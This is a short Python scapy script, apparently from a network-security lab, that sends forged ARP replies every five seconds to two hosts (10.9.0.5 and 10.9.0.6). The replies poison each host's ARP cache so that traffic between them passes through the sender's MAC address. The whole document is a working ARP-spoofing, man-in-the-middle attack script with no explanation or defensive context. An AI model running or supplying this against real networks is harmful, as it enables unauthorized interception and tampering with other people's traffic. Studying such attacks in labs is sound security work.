#!/usr/bin/python3
from time import sleep
from scapy.all import *

while True :
    
    E = Ether(src = '02:42:0a:09:00:69',dst = '02:42:0a:09:00:05')
    A = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6',hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')
    pkt = E/A
    pkt.show()
    sendp(pkt)
    
    E = Ether(src = '02:42:0a:09:00:69',dst = '02:42:0a:09:00:06')
    A = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.5',hwdst='02:42:0a:09:00:06', pdst='10.9.0.6')
    pkt = E/A
    pkt.show()
    sendp(pkt)
    
    time.sleep(5)
